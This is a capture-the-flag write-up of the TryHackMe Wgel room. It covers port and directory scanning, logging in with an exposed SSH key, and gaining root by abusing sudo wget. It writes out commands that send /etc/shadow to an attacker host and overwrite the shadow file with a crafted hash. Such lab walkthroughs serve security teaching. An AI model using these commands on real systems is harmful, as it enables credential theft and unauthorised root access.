---
title: "TryHackMe - Wgel CTF"
author: Nasrallah
description: ""
date: 2022-04-29 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, sudo, wget]
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello l33ts, I hope you are doing well. We are doing [Wgel CTF](https://tryhackme.com/room/wgelctf) from [TryHackMe](https://tryhackme.com). We start by enumerating the machine with nmap, we find ssh on port 22 and a webserver on port 80. We run a directory scan and find private key, we use the latter with a username we found in the webpage source code to login with ssh. After getting access to the machine we find that we can run `wget` as root, we leverage that to get root access by replacing the shadow file with one we modified. Let's get started.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```Terminal
Nmap scan report for 10.10.165.173
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We got 2 open ports. Let's check the webserver on port 80.

### Web

Navigating to the webpage we get this.

![](/assets/img/tryhackme/wgel/1.png)

It's the default page for apache, let's view the source code.

![](/assets/img/tryhackme/wgel/2.png)

We found a possible username.

### Gobuster

Let's run a directory scan with `gobuster`.

![](/assets/img/tryhackme/wgel/3.png)

We found a directory named **sitemap**, let's go see what' there.

![](/assets/img/tryhackme/wgel/4.png)

It's a UNAPP template page, nothing really useful, let's run another directory scan on sitemap.

![](/assets/img/tryhackme/wgel/6.png)

Wow, we found **.ssh** directory, let's go take a look and hope there is a private key waiting for us there.

![](/assets/img/tryhackme/wgel/5.png)

Great! We got an ssh private key.


## **Foothold**

Let's copy that key to a file in our machine and give it the right permission, then let's use it with the username we found earlier to login with ssh.

![](/assets/img/tryhackme/wgel/7.png)

Nice, we got access to the box. Let's escalate our privileges now.


## **Privilege Escalation**

First, let's check our current privileges with the command `sudo -l`.

![](/assets/img/tryhackme/wgel/8.png)

We see that we can run every command as root, but we need a password for that, on the other hand, we can run `wget` with no password.

I searched on Google for a way to escalate privileges with `wget` and found this [article](https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/) explaining how to do so.

What we can do is read the /etc/shadow file, get a hash, and try to crack that hash. First let's setup a listener on our machine with the command `nc -lvnp 80` 

![](/assets/img/tryhackme/wgel/9.png)

Now on the compromised machine, run `sudo wget --post-file=/etc/shadow {attacker_ip}`

![](/assets/img/tryhackme/wgel/10.png)

Now going back to our listener, we should have received the content of **shadow** file.

![](/assets/img/tryhackme/wgel/11.png)

Great! We have the shadow file, I've tried to crack the hash but got nothing.

One other thing we can try is to modify the shadow file by putting our own crafted hash and upload it the the compromised machine.

First, let's generate a new password hash using the command `openssl passwd -6 pass123`.

![](/assets/img/tryhackme/wgel/12.png)

The password i used is **pass123**, you can choose whatever you want.

Let's replace jessie's hash with the one we just created.

![](/assets/img/tryhackme/wgel/13.png)

Great! Now let's upload the file to the machine using the command `sudo wget http://10.11.31.131/shadow --output-document=shadow`

> Note: You have to change the directory to **/etc** before uploading the file.

![](/assets/img/tryhackme/wgel/14.png)

Now that we replaced the shadow file, let's change our user to root. We know that jessie can execute any command as root using a password, let's run the command `sudo su` and submit the password we specified while creating the hash, in my case it's `pass123`.

![](/assets/img/tryhackme/wgel/15.png)

Great! We got root.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References

https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/